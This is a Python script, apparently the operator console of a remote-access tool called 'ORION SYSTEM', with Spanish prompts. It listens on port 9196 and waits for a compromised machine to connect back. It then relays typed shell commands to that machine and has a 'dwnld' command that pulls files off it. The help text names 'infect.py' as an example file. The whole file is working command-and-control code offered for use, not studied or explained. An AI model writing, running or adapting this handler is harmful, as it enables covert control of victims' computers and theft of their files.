from socket import socket
import os
os.system("clear")
print("[ ORION SYSTEM ] Actualizando bibliotecas")
os.system("pip install colorama")
os.system("pip3 install colorama")
os.system("clear")

from colorama import Fore, Style, Back, init
init()

logo = f"""{Style.BRIGHT}{Fore.RED}
         {Style.BRIGHT}{Fore.RED}(        )
         {Style.BRIGHT}{Fore.RED}O        O
         {Style.BRIGHT}{Fore.RED}()      ()
          {Style.BRIGHT}{Fore.RED}Oo.nn.oO
           {Style.BRIGHT}{Fore.RED}_mmmm_
        {Style.BRIGHT} {Fore.RED}\/_mmmm_\/
        {Style.BRIGHT} {Fore.RED}\/_mmmm_\/
         {Style.BRIGHT}{Fore.RED}\/_mmmm_\/
         {Style.BRIGHT}{Fore.RED}\/ mmmm \/
             {Style.BRIGHT}{Fore.RED}nn
             {Style.BRIGHT}{Fore.RED}()
             {Style.BRIGHT}{Fore.RED}()
              {Style.BRIGHT}{Fore.RED}()    /
        {Style.BRIGHT}{Fore.WHITE}Orion{Fore.RED}  ()__()
                {Style.BRIGHT}{Fore.RED}'--'{Style.RESET_ALL}"""
                
Comandos3 = f"""
{Style.BRIGHT}################################################
{Style.BRIGHT}exit  = Terminar la SHELL            
{Style.BRIGHT}dwnld = Descargar archivo  
{Style.BRIGHT}Ejemplo: dwnld C: \ Users \ perfil \ infect.py
{Style.BRIGHT}################################################"""
server_address = ('0.0.0.0', 9196)

def recibir_datos(sock):
    try:
        size_header = sock.recv(4).decode().strip()
        if not size_header:
            return None
        buffer_size = int(size_header)
        
        data = sock.recv(buffer_size)
        return data
    except Exception as e:
        print(f"Error al recibir datos: {e}")
        return None

def main():
    with socket() as server_socket:
        server_socket.bind(server_address)
        server_socket.listen(1)
        print(logo)
        print(Comandos3)
        print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}ORION SYSTEM {Fore.RED}] {Fore.WHITE}Esperando conexiones desde: {Style.RESET_ALL}{server_address}")

        try:
            client_socket, client_address = server_socket.accept()
            print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}ORION SYSTEM {Fore.RED}] {Fore.WHITE}Se acepto la conexion de: {Style.RESET_ALL}{client_address}")

            with client_socket:
                while True:
                    comando_enviar = input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}ORION CMD {Fore.RED}]{Fore.WHITE}: {Style.RESET_ALL}").strip()
                    
                    client_socket.send(f"{len(comando_enviar):04}".encode())
                    client_socket.send(comando_enviar.encode())

                    if comando_enviar.lower() == 'exit':
                        print(f"{Style.RESET_ALL}{Fore.RED}Cerrando conexión...{Style.RESET_ALL}")
                        break

                    if comando_enviar.split(" ")[0].lower() == 'dwnld':
                        print("Esperando contenido del archivo...")
                        archivo_contenido = recibir_datos(client_socket)

                        if archivo_contenido:
                            nombre_archivo = comando_enviar.split(" ")[1].split("\\")[-1]
                            with open(nombre_archivo, 'wb') as f:
                                f.write(archivo_contenido)
                            print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}ORION SYSTEM {Fore.RED}]{Fore.WHITE}Archivo guardado como '{nombre_archivo}'{Style.RESET_ALL}")
                        else:
                            print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}ORION SYSTEM {Fore.RED}]{Fore.WHITE}No se recibió ningún contenido del archivo{Style.RESET_ALL}")
                    else:
                        respuesta = recibir_datos(client_socket).decode()
                        print(f"Respuesta:\n{respuesta}")

        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}Error del servidor: {Fore.WHITE}{e}{Style.RESET_ALL}")
if __name__ == "__main__":
    main()